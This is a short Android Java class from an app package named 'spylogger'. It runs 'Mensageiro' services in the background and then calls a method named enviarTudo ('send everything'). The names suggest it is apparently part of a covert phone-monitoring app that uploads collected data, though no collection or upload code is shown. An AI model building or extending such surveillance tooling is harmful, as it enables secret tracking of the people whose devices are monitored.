package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.os.AsyncTask;

import com.gravatasufoca.spylogger.services.Mensageiro;
import com.gravatasufoca.spylogger.utils.Utils;

/**
 * Created by bruno on 21/04/17.
 */

public class MensageiroAsyncHelper extends AsyncTask<Mensageiro,Integer,Boolean> {

    private Context context;

    public MensageiroAsyncHelper(Context context) {
        this.context = context;
    }

    @Override
    protected Boolean doInBackground(Mensageiro... mensageiros) {
        if(mensageiros!=null){

            for (Mensageiro mensageiro:mensageiros) {
                mensageiro.start();
            }
            Utils.enviarTudo(context);
            return true;
        }
        return false;
    }

}
